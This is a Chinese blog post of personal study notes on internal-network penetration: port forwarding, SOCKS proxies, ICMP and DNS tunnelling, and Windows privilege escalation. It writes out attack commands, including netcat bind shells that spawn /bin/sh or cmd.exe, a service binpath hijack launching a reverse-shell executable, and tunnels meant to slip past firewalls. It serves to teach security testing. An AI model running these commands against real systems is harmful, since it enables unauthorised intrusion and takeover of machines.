<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内网学习 | Pale</title><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="转发和代理端口转发和代理正向和反向连接正向连接 攻击主动连接受控机    要求 两机器都有公网ip 问题 1.受防火墙限制 2.存在权限不足问题 3.受控机无公网ip连不了 反向连接 受控机主动反向连接攻击机 好处 ：突破 正向连接的B问题">
<meta property="og:type" content="article">
<meta property="og:title" content="内网学习">
<meta property="og:url" content="http://example.com/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Pale">
<meta property="og:description" content="转发和代理端口转发和代理正向和反向连接正向连接 攻击主动连接受控机    要求 两机器都有公网ip 问题 1.受防火墙限制 2.存在权限不足问题 3.受控机无公网ip连不了 反向连接 受控机主动反向连接攻击机 好处 ：突破 正向连接的B问题">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2023-02-21T05:57:41.000Z">
<meta property="article:modified_time" content="2023-03-21T06:09:39.576Z">
<meta property="article:author" content="One">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-03-21 14:09:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-21T05:57:41.000Z" title="Created 2023-02-21 13:57:41">2023-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-21T06:09:39.576Z" title="Updated 2023-03-21 14:09:39">2023-03-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="转发和代理"><a href="#转发和代理" class="headerlink" title="转发和代理"></a>转发和代理</h1><h2 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h2><h3 id="正向和反向连接"><a href="#正向和反向连接" class="headerlink" title="正向和反向连接"></a>正向和反向连接</h3><p>正向连接 <strong>攻击主动连接</strong>受控机   </p>
<p>要求 <strong>两机器都有公网ip</strong></p>
<p>问题 1.受防火墙限制 2.存在权限不足问题 3.受控机无公网ip连不了</p>
<p>反向连接 <strong>受控机主动反向连接</strong>攻击机</p>
<p>好处 ：突破 正向连接的B问题</p>
<span id="more"></span>

<h3 id="端口转发和映射"><a href="#端口转发和映射" class="headerlink" title="端口转发和映射"></a>端口转发和映射</h3><p>端口转发 一个端口收到的数据-另一个网络端口 端口可以是本机也可以是其他主机</p>
<p>端口映射 把外网主机请求映射到内网主机 使得没有公网ip的内网主机能对外提供服务 </p>
<p>并没有严格属于解释 有时一并谈论</p>
<h3 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h3><p>标准端口1080 有socks4和5两版本 </p>
<p>4和5的区别 4只支持tcp 5还支持udp和各种身份验证 </p>
<p>内网渗透可以搭建socks代理 与目标内网主机通信</p>
<h2 id="常见转发代理工具"><a href="#常见转发代理工具" class="headerlink" title="常见转发代理工具"></a>常见转发代理工具</h2><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><p>内网端口转发工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一：</span><br><span class="line">lcx.exe -tran 4444 127.0.0.1 3389(情景：3389禁止访问，工具把3389转发到4444上去访问，需要目标机器有公网ip)</span><br><span class="line">二：</span><br><span class="line">lcx.exe -tran 2222 10.10.10.15 22(情景 15机为内网机 只能和取得shell的12机相通，则在12机上执行此命令 将内网15机器的22端口转发到12机上的2222端口)(端口映射)</span><br><span class="line">三：</span><br><span class="line">vps：./lcx -listen 4444 8888(情景 此命令作用与vps 内网主机没有公网ip通过其他方式取得了shell  然后用内网机连接vps 使其8888收到的数据转给4444)</span><br><span class="line">内网机：lcx.exe -slave 192.168.2.x 8888 127.0.0.1 3389 </span><br><span class="line">再通过访问vps的4444端口访问到内网机的远程桌面</span><br><span class="line">攻击机：rdesktop 192.168.2.x:4444</span><br></pre></td></tr></table></figure>



<h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><p>内网穿透 高性能反向代理 支持tcp/udp/http/https等 常用隧道工具 支持搭建socks5代理应用</p>
<p>win和linux双系统 包括 frps frps.ini frpc frpc.ini 服务端客户端程序及配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x</span><br><span class="line">sever_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br><span class="line">简单理解 frps=vps端  frpc为受控机</span><br><span class="line">受控机的1080端口将流量转发至vps的7000端口</span><br><span class="line">后续  使用proxifier或者 proxychains 配置写192.168.2.x主机 端口写1080就可以</span><br></pre></td></tr></table></figure>

<h4 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h4><p>外网机器服务端 安装后注意 端口 开放</p>
<p>tcp穿透</p>
<p>socks5 +proxfier</p>
<p>被转发的机器   敲命令  客户端有</p>
<p><img src="image-20230208180131246.png" alt="image-20230208180131246"></p>
<p>主要问题  注意vps端口和安全组  宝塔和云平台都要开</p>
<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>在一般通信过程中，如果两台设备需要进行通信，肯定要开放端口，但是<code>ICMP</code>协议就不需要。最常见的ICMP消息为<code>ping</code>命令回复，攻击者可以利用命令行得到比回复更多的ICMP请求。</p>
<p><strong>工具：</strong></p>
<ul>
<li><code>icmpsh</code>、<code>PingTunnel</code>、<code>icmptunnel</code>、<code>powershell icmp</code></li>
</ul>
<h4 id="icmpsh使用"><a href="#icmpsh使用" class="headerlink" title="icmpsh使用"></a>icmpsh使用</h4><ul>
<li><code>git clone https://github.com/inquisb/icmpsh.git</code> 下载工具</li>
<li><code>pip2 install impacket</code> 下载包依赖</li>
<li><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> 关闭icmp回应</li>
<li><code>python2 icmpsh_m.py &lt;攻击机IP&gt; &lt;目标机器IP&gt;</code></li>
<li>执行结果会在攻击机回连一个shell</li>
</ul>
<h4 id="PingTunnel使用"><a href="#PingTunnel使用" class="headerlink" title="PingTunnel使用"></a>PingTunnel使用</h4><p>局限：中转服务器一定要是Linux</p>
<p>解决局限：<a target="_blank" rel="noopener" href="https://blog.csdn.net/markecheng/article/details/110352161?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.pc_relevant_antiscanv2&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7">https://blog.csdn.net/markecheng/article/details/110352161?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.pc_relevant_antiscanv2&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装libpacap环境依赖</span></span><br><span class="line">apt-get install byacc</span><br><span class="line">apt-get install flex bison</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装PingTunnel</span></span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Linux的 web服务器上操作</span></span><br><span class="line">ptunnel -x &lt;连接密码&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在攻击上的操作</span></span><br><span class="line">ptunnel -p &lt;流量转发服务的iP&gt; -lp &lt;本地监听的端口&gt; -da &lt;转发的目标机器的IP&gt; -dp &lt;转发的目标机器的端口&gt; -x &lt;连接密码&gt;</span><br></pre></td></tr></table></figure>

<h4 id="防御ICMP隧道"><a href="#防御ICMP隧道" class="headerlink" title="防御ICMP隧道"></a>防御ICMP隧道</h4><ul>
<li>检测同一来源的ICMP数据包的数量。使用ICMP隧道在短时间产生大量数据包</li>
<li>注意那些Payload大于64bit的ICMP数据包</li>
<li>寻找响应和请求不一致的数据包</li>
<li>检查ICMP数据包的协议标签</li>
</ul>
<h3 id="IPV6隧道"><a href="#IPV6隧道" class="headerlink" title="IPV6隧道"></a>IPV6隧道</h3><p>IPV6隧道就是值通过IPV4隧道传送IPV6数据报文的技术。</p>
<p><strong>工作原理：</strong></p>
<p><img src="image-20220401202743562.png" alt="image-20220401202743562"></p>
<ol>
<li>节点A要想节点B发送IPV6报文，首先需要在节点A和节点B之间建立一条隧道</li>
<li>A将IPV6报文封装在以节点B的IPV4地址为目的地址、以自己的IPV4地址为源地址的IPV4报文中，并发往IPV4海洋</li>
<li>在IPV4海洋中，这个报文和普通报文一样，经过IPV4转发到达节点B</li>
<li>节点B接受到之后，接触IPV4封装，取出其中的IPv6报文</li>
</ol>
<p><strong>绕过原理：</strong></p>
<p>因为现阶段的边界设备，防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6。攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。<strong>及时设备支持IPv6，也有可能无法正确分析封装了IPv6报文的IPv4数据包</strong></p>
<p><strong>工具：</strong></p>
<ul>
<li><code>socat</code> 、<code>6tunnel</code>、<code>nt6tunnel</code></li>
</ul>
<p><strong>防御：</strong> 过滤<code>IPv6</code>协议通信</p>
<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><h4 id="抓取Banner信息"><a href="#抓取Banner信息" class="headerlink" title="抓取Banner信息"></a>抓取Banner信息</h4><ul>
<li><code>nc -nv &lt;目标IP&gt; &lt;目标端口&gt;</code></li>
</ul>
<h4 id="指定端口的扫描"><a href="#指定端口的扫描" class="headerlink" title="指定端口的扫描"></a>指定端口的扫描</h4><ul>
<li><p><code>nc -v &lt;目标IP&gt; &lt;目标端口&gt;</code></p>
</li>
<li><p><code>nc -vz &lt;目标iP&gt; &lt;端口-端口&gt;</code> （巨慢）</p>
</li>
</ul>
<h4 id="端口监听"><a href="#端口监听" class="headerlink" title="端口监听"></a>端口监听</h4><ul>
<li><code>nc -lp 9999</code></li>
<li>当端口被访问时信息会输出到控制台</li>
</ul>
<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><ul>
<li><code>nc -lvvp 2233 &gt;1.txt</code>  监听本地2233，当有数据 输入到 1.txt</li>
<li><code>nc -vn &lt;目标IP&gt; &lt;目标端口&gt; &lt;2.txt</code>  把2.txt文件内容传输到目标的指定端口</li>
</ul>
<h4 id="简易聊天"><a href="#简易聊天" class="headerlink" title="简易聊天"></a>简易聊天</h4><ul>
<li><code>nc -lp 2233</code></li>
<li><code>nc -vn &lt;目标IP&gt; &lt;指定端口&gt;</code></li>
</ul>
<h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p><strong>正向：</strong>(攻击机连接目标机器，目标机器启动监听)</p>
<ul>
<li><code>nc -lvvp 2233 -e /bin/sh</code>   Linux</li>
<li><code>nc -lvvp 2233 -e C:\windows\system32\cmd.exe</code>  Windows</li>
</ul>
<p><strong>反向</strong>：(攻击机开启监听，目标机器使用反弹shell命令进行回连)</p>
<h3 id="HTTP-HTTPS隧道"><a href="#HTTP-HTTPS隧道" class="headerlink" title="HTTP/HTTPS隧道"></a>HTTP/HTTPS隧道</h3><p>就是通过上传web上传的脚本文件，将流量转发到内网。</p>
<h3 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h3><h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><p>在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度来看：这样的操作只是在一次次查询某个特定的域名并得到解析结果。</p>
<p>在使用DNS隧道与外部进行通信时，从表面上看没有连接到外网的（内网网关没有转发IP数据包），但实际上，内网的DNS服务器进行了中转操作。</p>
<h5 id="DNS解析配置"><a href="#DNS解析配置" class="headerlink" title="DNS解析配置"></a>DNS解析配置</h5><p><img src="image-20220402133307572.png" alt="image-20220402133307572"></p>
<p>第一条A类记录，告诉域名系统，”dns.xxx.com”的IP地址是”121.xxx.xxx.xxx”</p>
<p>第二条NS记录，告诉域名系统，”dns2tcp.xxx.com”的域名由”dns.xxx.com”进行解析。</p>
<p>最后这条”dns2tcp.xxx.com”的DNS就会被”121.xxx.xxx.xxx”的主机(也就是我们的VPS)，给解析掉。</p>
<p>配置完之后，可以ping一下dns.xxx.com，观察是否能ping通。</p>
<h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h5><ul>
<li>vps 安装 iodine</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install iodine</span><br></pre></td></tr></table></figure>

<ul>
<li>在VPS上运行iodine的服务端iodined</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iodined -f -c -P husins 192.168.0.1 dns2tcp.xxx.com -DD</span><br><span class="line"> </span><br><span class="line"> <span class="comment">#-f：在前台运行</span></span><br><span class="line"> <span class="comment">#-c：禁止检查所有传入请求的客户端IP地址。</span></span><br><span class="line"> <span class="comment">#-P：客户端和服务端之间用于验证身份的密码。</span></span><br><span class="line"> <span class="comment">#-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。</span></span><br><span class="line"> <span class="comment">#这里的192.168.0.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突</span></span><br><span class="line"> <span class="comment">#注意填写的地址为NS记录</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在目标主机执行</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -P h dns2tcp.xxx.com  -M 200</span><br><span class="line"></span><br><span class="line"><span class="comment">#-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道</span></span><br><span class="line"><span class="comment">#-M：指定上行主机的大小。</span></span><br><span class="line"><span class="comment">#-m：调节最大下行分片的大小。</span></span><br><span class="line"><span class="comment">#-f：在前台运行</span></span><br><span class="line"><span class="comment">#-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。</span></span><br><span class="line"><span class="comment">#-O：指定数据编码规范。</span></span><br><span class="line"><span class="comment">#-P：客户端和服务端之间用于验证身份的密码。</span></span><br><span class="line"><span class="comment">#-L：指定是否开启懒惰模式，默认开启。</span></span><br><span class="line"><span class="comment">#-I：指定两个请求之间的时间间隔。</span></span><br></pre></td></tr></table></figure>



<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Windows权限描述"><a href="#Windows权限描述" class="headerlink" title="Windows权限描述"></a>Windows权限描述</h2><ul>
<li><code>User</code>: 普通用户权限，是系统中最安全的权限，因为分配给该组的默认权限不允许成员修改操作系统的设置和用户资料</li>
<li><code>Administrtor</code>: 管理员权限，可以利用Windows的机制将自己提升为<code>system</code>权限，以操作SAM文件等</li>
<li><code>system</code>：系统权限，可以对SAM等敏感文件进行读取，往往需要将<code>Administrator</code>权限提升到System权限才可以对散列值进行dump操作</li>
<li><code>TrustedInstaller</code>: windows 最高权限。对文件系统，即使拥有System权限也无法进行修改，只有拥有TrustedInstall权限的用户才可以修改系统文件</li>
</ul>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p><strong>原理：</strong>程序缓冲区的大小是事先设置好的，如果用户输入的数据的大小超过了缓存区的大小，程序就会溢出，攻击者使用该方法可以绕过系统的所有安全限制，利用该漏洞的关键是目标系统没有及时安装补丁。</p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
<li><p><code>whoami /groups</code> 获取当前权限的等级</p>
</li>
<li><p><code>systeminfo</code> 查看系统补丁</p>
</li>
<li><p><code>wmic qfe get caption,description,hotfixid,installedon</code></p>
</li>
<li><p><strong>-使用wes-ng</strong> (Windows Exploit Suggester)</p>
</li>
</ul>
<p><img src="image-20230312211834370.png" alt="image-20230312211834370"></p>
<p><code>wes sysinfo.txt --impact &quot;Elevation of Privilege&quot; </code></p>
<p><code>wes sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only </code></p>
<ul>
<li><strong>msf</strong> </li>
</ul>
<p>local_exploit_suggester： 提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议</p>
<p>enum_patches ：据漏洞编号快速找出系统中缺少的补丁</p>
<ul>
<li><strong>sherlock 脚本</strong> <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></li>
</ul>
<p>1 输入Import-Module .\Sherlock.ps1导入脚本<br>2 输入Find-AllVulns 扫描</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">常见EXP</a></li>
<li><code>Cobalt Strike 3.6</code> 新增了<code>elevate</code>功能。</li>
<li><a target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan/">在线提权辅助</a></li>
</ul>
<h2 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h2><p><code>Windows</code>系统服务在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。<code>Windows</code>服务是以<code>System</code>权限运行的，因此，其文件夹、文件和注册表键值都是受强访问控制机制保护的。但是在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务</p>
<p>有以下两种利用方式：</p>
<ul>
<li>服务未运行：攻击者会使用任意服务来替换原来的服务，然后重启服务</li>
<li>服务正在运行且无法终止：这种情况符合绝大多数的漏洞利用场景，攻击者会利用DLL劫持并尝试重启服务来提权</li>
</ul>
<p>攻击手法</p>
<ul>
<li><code>PowerUp.ps1</code>脚本的<code>Invoke-Checks</code>模块</li>
<li><code>MSF</code>的<code>service_permissions</code>模块<ul>
<li>该模块使用两种方式获取<code>system</code>权限：如果<code>meterpreter</code>以管理员权限运行，该模块会尝试创建并运行一个新的服务；如果当前权限不允许创建服务，该模块会判断那些服务的文件或者文件夹存在权限问题，并允许对其劫持。</li>
</ul>
</li>
</ul>
<h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>一些以system权限启动的应用，如果让其启动时执行其他程序 就可获得系统权限</p>
<p><strong>AccessChk</strong> 枚举主机上存在系统缺陷的系统服务</p>
<p>各种方式查找到后使用<code>sc config xxxx binpath（指定的二进制文件路径）= &quot;cmd.exe(要改的高权系统程序)&quot; /k &quot;C:\Users\Public\reverse_tcp.exe&quot;(需要系统权限的马什么的)等号后必须有一个空格</code></p>
<p>如果有重启服务权限可以直接<code>sc stop &lt;service&gt;</code>      <code>sc start &lt;service&gt;</code>重启如果 没权限 就重启开机吧</p>
<h3 id="服务注册表权限脆弱"><a href="#服务注册表权限脆弱" class="headerlink" title="服务注册表权限脆弱"></a>服务注册表权限脆弱</h3><p>注册表ACL配置错误 低权用户对服务的注册表有写入权限 通过修改注册表更改服务配置</p>
<p><code>accesschk.exe /acceptula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services</code> 枚举 Authenticated Users用户组具有写入权限的服务注册表</p>
<p>以下命令将xyz服务注册表种的ImagePath指向预先上传的攻击载荷</p>
<p><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xyz /v Imagepath /t</code></p>
